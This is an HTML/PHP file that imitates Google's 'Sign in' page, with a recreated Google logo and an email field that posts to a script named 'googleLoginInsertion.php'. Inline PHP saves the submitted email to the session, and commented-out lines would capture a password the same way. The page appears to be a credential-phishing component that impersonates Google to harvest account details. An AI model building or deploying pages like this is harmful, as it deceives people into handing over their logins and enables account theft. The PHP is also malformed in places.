<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600;750&display=swap" rel="stylesheet">
    <title>Login Form</title>
    <style>
        body {
            font-family: 'Noto Sans', Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .google-logo {
            font-family: 'Noto Sans', sans-serif;
            font-size: 23px;
            font-weight: 600;
            letter-spacing: -3.8px;
            position: absolute;
            top: 35px;
        }
        .google-logo span {
            display: inline-block;
        }
        .g1 { color: rgb(66,133,244); }
        .o1, .e { color: rgb(234,67,53); }
        .o2 { color: rgb(251,188,5); }
        .g2 { color: rgb(66,133,244); }
        .l  { color: rgb(52, 168,83); }
        h2 {
            font-size: 24px;
            color: rgb(32,33,36);
            position: absolute;
            top: 65px;
            font-weight: 400;  /* Adjusted the font weight */
        }
        p {
            color: rgb(32,33,36);
            /*color: #5F6368; REALLY NICE GRAY COLOR */
            font-size: 14px;
            position: absolute;
            top: 115px;
            font-weight: 400;
        }
        .form-input {
            width: 345px;
            height: 50px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 14px;
            position: absolute;
            top: 200px; 
            left: 50%;
            margin-left: -172.5px; 
            box-sizing: border-box;
        }
        .submit-btn {
            width: 21%;
            padding: 10px;
            position: absolute;
            margin-left: 90px; 
            top: 390px; 
            border-radius: 5px;
            border: none;
            color: white;
            background-color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
        }
        .forgotE {
            position: absolute;
            top: 240px;
            left: 25px;
            font-size: 13.5px;
            font-weight: 500px;
            color: #1a73e8;
            font-weight: 400;
        }
        .private {
            position: absolute;
            top: 300px;
            left: 25px;
            font-size: 12px;
            color: #5F6368;
            font-weight: 400;
            width: 345px;
        }
        .learn{
            color: #1a73e8;
            font-weight: 400;
        }
        .createA {
            position: absolute;
            left: 25px;
            top: 385px; 
            font-size: 13.5px;
            color: #1a73e8;
            font-weight: 400;
        }
    </style>
</head>
<body>
    <div class="google-logo">
        <span class="g1">G</span>
        <span class="o1">o</span>
        <span class="o2">o</span>
        <span class="g2">g</span>
        <span class="l">l</span>
        <span class="e">e</span>
    </div>
    <h2>Sign in</h2>
    <p>Use your Google Account</p>
    <form action="googleLoginInsertion.php" method="POST">
        <input class="form-input" type="email" name="email" placeholder="Email or phone" required>
        <button class="submit-btn" type="submit">Next</button>
        <p class = "forgotE">Forgot Email?</p>
        <p class = "private">Not on your computer? Use a private browsing window to sign in. <span class = "learn">Learn more</span></p>

        <p class = "createA">Create Account</p>


    </form>
    <?php
        $email = $_POST['email'];
        $_SESSION['email'] = $email

        // $password = $_POST['password'];
        // $_SESSION['password'] = $password
    ?>
</body>
</html>
